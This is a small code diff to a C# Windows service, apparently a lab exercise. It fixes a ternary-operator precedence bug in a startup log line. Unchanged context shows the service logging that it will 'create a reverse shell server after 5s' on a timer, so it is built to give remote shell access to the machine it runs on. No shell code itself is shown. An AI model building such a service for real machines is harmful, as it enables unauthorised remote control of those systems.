@@ -26,7 +26,7 @@ namespace ServiceBai3
         }
         protected override void OnStart(string[] args)
         {
-            WriteToFile("Internet connection: " + CheckForInternetConnection() ? "OK" : "Failed");
+            WriteToFile("Internet connection: " + (CheckForInternetConnection() ? "OK" : "Failed"));
             WriteToFile("Create a reverse shell server after 5s, please wait....");
             timer.Elapsed += new ElapsedEventHandler(OnElapsedTime);
             timer.Interval = 5000;
